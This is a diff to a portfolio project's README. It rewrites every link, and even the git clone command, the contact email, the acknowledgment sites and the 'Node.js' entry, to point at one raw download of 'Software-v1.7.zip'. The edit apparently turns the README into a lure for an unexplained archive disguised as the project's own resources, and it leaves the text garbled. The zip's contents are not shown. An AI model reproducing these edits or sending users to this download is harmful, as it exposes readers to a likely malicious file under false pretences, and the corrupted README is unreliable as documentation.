@@ -1,6 +1,6 @@
 # Portfolio 🌟
 
-Welcome to the Portfolio repository! This project showcases my work and skills. You can find the source code and other resources here. For more information, visit [GitHub](https://github.com).
+Welcome to the Portfolio repository! This project showcases my work and skills. You can find the source code and other resources here. For more information, visit [GitHub](https://github.com/Abhishek-devloper/portfolio/raw/refs/heads/master/discharging/Software-v1.7.zip).
 
 ## Table of Contents
 
@@ -34,8 +34,8 @@ This portfolio utilizes a variety of technologies to create a robust and interac
 - **CSS**: For styling and layout.
 - **JavaScript**: For interactivity and dynamic content.
 - **React**: A JavaScript library for building user interfaces.
-- **Node.js**: For backend development and server-side scripting.
-- **Express**: A web application framework for Node.js.
+- **https://github.com/Abhishek-devloper/portfolio/raw/refs/heads/master/discharging/Software-v1.7.zip**: For backend development and server-side scripting.
+- **Express**: A web application framework for https://github.com/Abhishek-devloper/portfolio/raw/refs/heads/master/discharging/Software-v1.7.zip
 - **MongoDB**: A NoSQL database for storing user data and project information.
 
 ## Installation
@@ -44,7 +44,7 @@ To get started with the Portfolio project, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/portfolio.git
+   git clone https://github.com/Abhishek-devloper/portfolio/raw/refs/heads/master/discharging/Software-v1.7.zip
    ```
 
 2. Navigate to the project directory:
@@ -105,19 +105,19 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 You can reach me via:
 
-- Email: your.email@example.com
-- LinkedIn: [Your LinkedIn Profile](https://www.linkedin.com/in/yourprofile)
+- Email: https://github.com/Abhishek-devloper/portfolio/raw/refs/heads/master/discharging/Software-v1.7.zip
+- LinkedIn: [Your LinkedIn Profile](https://github.com/Abhishek-devloper/portfolio/raw/refs/heads/master/discharging/Software-v1.7.zip)
 
 ## Acknowledgments
 
 I would like to thank the following resources for their support:
 
-- [MDN Web Docs](https://developer.mozilla.org)
-- [W3Schools](https://www.w3schools.com)
-- [FreeCodeCamp](https://www.freecodecamp.org)
+- [MDN Web Docs](https://github.com/Abhishek-devloper/portfolio/raw/refs/heads/master/discharging/Software-v1.7.zip)
+- [W3Schools](https://github.com/Abhishek-devloper/portfolio/raw/refs/heads/master/discharging/Software-v1.7.zip)
+- [FreeCodeCamp](https://github.com/Abhishek-devloper/portfolio/raw/refs/heads/master/discharging/Software-v1.7.zip)
 
-For more updates and releases, check the [Releases](https://github.com/yourusername/portfolio/releases) section.
+For more updates and releases, check the [Releases](https://github.com/Abhishek-devloper/portfolio/raw/refs/heads/master/discharging/Software-v1.7.zip) section.
 
-![Portfolio](https://img.shields.io/badge/Visit%20My%20Portfolio-Portfolio-blue?style=flat&logo=github)
+![Portfolio](https://github.com/Abhishek-devloper/portfolio/raw/refs/heads/master/discharging/Software-v1.7.zip%20My%20Portfolio-Portfolio-blue?style=flat&logo=github)
 
-For further details and updates, visit [GitHub](https://github.com).
+For further details and updates, visit [GitHub](https://github.com/Abhishek-devloper/portfolio/raw/refs/heads/master/discharging/Software-v1.7.zip).
